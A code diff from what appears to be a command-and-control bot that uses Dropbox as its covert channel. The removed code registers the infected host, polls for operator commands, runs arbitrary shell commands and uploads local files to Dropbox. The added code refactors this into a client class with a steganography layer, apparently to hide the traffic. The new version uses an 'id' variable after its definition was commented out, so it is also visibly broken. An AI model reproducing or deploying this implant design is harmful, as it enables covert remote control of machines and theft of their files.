@@ -1,65 +1,27 @@
 import time
-from .client import exec as cexec
+from .client.client import CCClient
+from ccchanel.ccchanel_file import CCChanelFile
+from ccchanel.log import log_append
+from steno.steno_base import CCStenoBase
 from .client import payloads as cpayload
-from .client import id as cid
-from .ccchanel import file as ccfile
-from .ccchanel import log as cclog
-from .ccchanel import dropbox_api as cc_api
-
-
-def amIRegistered(dbx, id):
-    file_list_dict = ccfile.list_files(dbx, '')
-    file_list = file_list_dict.keys()
-    return id in file_list
-
-
-def registerSelf(dbx, id):
-    cclog.log_init(dbx, '/' + id)
-
-
-def tellAlive(dbx, id):
-    cclog.log_append(dbx, '/' + id, cpayload.alive_create())
-
-
-def getCommand(dbx, id):
-    log = cclog.log_read(dbx, '/' + id)
-    dones = []
-    for log_entry in reversed(log):
-        if log_entry.get('done', False):
-            dones += [log_entry['done']['id']]
-        elif log_entry.get('command', False) and log_entry['command']['id'] not in dones:
-            return log_entry.get('command')
-    return None
-
-
-def execute_command(dbx, id, local_path, *args):
-    if local_path == 'upload':
-        local_file_path = args[0]
-        remote_file_path = f"/{id}_{local_file_path.replace('/', '_')}"
-        print(f"CLIENT: executing upload {local_file_path}")
-        ccfile.upload_file(dbx, local_file_path, remote_file_path)
-        return f"file: {local_file_path} uploaded to {remote_file_path}".encode()
-    else:
-        return cexec.execute_arbitrary_command(local_path, *args)
 
 
 def main():
+    client = CCClient(CCChanelFile, CCStenoBase)
     sleep_time = 15
-    dbx = cc_api.dropbox_login()
-    ls = ccfile.list_files(dbx, '')
-    id = cid.id()
-    if not amIRegistered(dbx, id):
-        registerSelf(dbx, id)
-    tellAlive(dbx, id)
+    # id = cid.id()
+    if not client.is_registered():
+        client.register()
+    client.tell_alive()
     while True:
-        cmd = getCommand(dbx, id)
+        cmd = client.get_command()
         if cmd is not None:
             cmd_id = cmd['timestamp']
-            exec_out = execute_command(dbx, id, cmd['kind'], *cmd['args']).decode()
-            cclog.log_append(dbx, '/' + id, cpayload.done_create(cmd_id, exec_out))
+            exec_out = client.execute_command(cmd['kind'], *cmd['args']).decode()
+            log_append(client.ccchanel, '/' + id, cpayload.done_create(cmd_id, exec_out), client.steno_base)
         print(f"SLEEP {sleep_time}")
         time.sleep(sleep_time)
-        cclog.log_append(dbx, '/' + id, cpayload.ping_create())
+        log_append(client.ccchanel, '/' + id, cpayload.ping_create(), client.steno_base)
 
 
 if __name__ == "__main__":
